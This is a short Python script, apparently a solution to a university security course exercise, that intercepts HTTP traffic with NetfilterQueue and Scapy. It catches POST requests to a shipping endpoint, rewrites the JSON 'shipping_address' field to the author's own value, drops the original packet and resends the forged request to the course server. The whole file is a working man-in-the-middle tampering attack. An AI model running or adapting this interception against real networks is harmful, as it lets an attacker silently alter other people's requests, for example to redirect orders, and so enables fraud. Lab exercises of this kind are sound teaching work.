from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests

def callback(pkt):
    dropped = False
    ip = IP(pkt.get_payload())
    if ip[TCP].dport == 80:
        if ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            fields = http.split("\r\n")
            if "POST /hw1/ex3/shipping" in fields[0]:
                data = fields[-1]
                json_data = json.loads(data)
                if "shipping_address" in json_data:
                    print("Packet with shipping address found:")
                    print(json_data)

                    # Changing shipping address
                    json_data["shipping_address"] = "andrea.piccione@epfl.ch"

                    # Checking modification
                    print("\nNew packet with changed shipping address:")
                    print(json_data)

                    # Dropping packet
                    pkt.drop()
                    dropped = True

                    # Sending new paket
                    print("\nSending new request with address changed\n")
                    r = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=json_data)
                    print("Server response:")
                    print(r.status_code, r.reason)
                    print("\nServer message:")
                    print(r.text)

                    print("\nMission completed! You can now stop the traffic with CTRL + C\n")

    if not dropped:
        pkt.accept()


# Starting looking at the traffic
nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)
print("Looking for packets to the shipping...\n")

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
